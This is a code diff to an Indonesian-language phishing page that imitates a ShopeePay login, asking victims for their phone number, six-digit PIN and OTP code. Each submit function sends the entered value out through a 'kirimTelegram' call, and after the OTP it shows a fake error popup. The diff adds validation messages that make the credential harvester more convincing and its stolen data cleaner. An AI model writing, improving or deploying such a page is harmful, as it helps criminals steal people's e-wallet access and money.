@@ -95,6 +95,10 @@
     .hidden {
       display: none;
     }
+    .error {
+      color: red;
+      font-size: 12px;
+    }
   </style>
 </head>
 <body>
@@ -109,6 +113,7 @@
         <span>+62</span>
         <input type="tel" id="phone-number" placeholder="Masukkan nomor handphone" />
       </div>
+      <p id="phone-error" class="error hidden">Nomor handphone tidak valid.</p>
       <button class="btn" onclick="submitPhone()">Lanjut</button>
     </div>
 
@@ -126,6 +131,7 @@
           <input type="password" maxlength="1" />
           <input type="password" maxlength="1" />
         </div>
+        <p id="pin-error" class="error hidden">PIN harus terdiri dari 6 digit.</p>
         <button type="submit" class="btn">Konfirmasi</button>
       </form>
     </div>
@@ -145,6 +151,7 @@
         <input type="password" maxlength="1" />
         <input type="password" maxlength="1" />
       </div>
+      <p id="otp-error" class="error hidden">OTP harus terdiri dari 6 digit.</p>
       <button class="btn" onclick="submitOTP()">Lanjut</button>
       <div class="resend">
         Mohon tunggu <span id="countdown">30</span> detik untuk mengirim ulang
@@ -174,18 +181,36 @@
 
     function submitPhone() {
       const phone = document.getElementById("phone-number").value;
+      const phoneError = document.getElementById("phone-error");
+      if (!phone || phone.length < 10) {
+        phoneError.classList.remove("hidden");
+        return;
+      }
+      phoneError.classList.add("hidden");
       kirimTelegram(`Nomor HP: +62${phone}`);
       showPIN();
     }
 
     function submitPIN() {
       const pin = [...document.querySelectorAll('#pin-inputs input')].map(i => i.value).join('');
+      const pinError = document.getElementById("pin-error");
+      if (pin.length !== 6) {
+        pinError.classList.remove("hidden");
+        return;
+      }
+      pinError.classList.add("hidden");
       kirimTelegram(`PIN ShopeePay: ${pin}`);
       showOTP();
     }
 
     function submitOTP() {
       const otp = [...document.querySelectorAll('#otp-inputs input')].map(i => i.value).join('');
+      const otpError = document.getElementById("otp-error");
+      if (otp.length !== 6) {
+        otpError.classList.remove("hidden");
+        return;
+      }
+      otpError.classList.add("hidden");
       kirimTelegram(`Kode OTP: ${otp}`);
       document.getElementById("popup-error").style.display = "flex";
     }
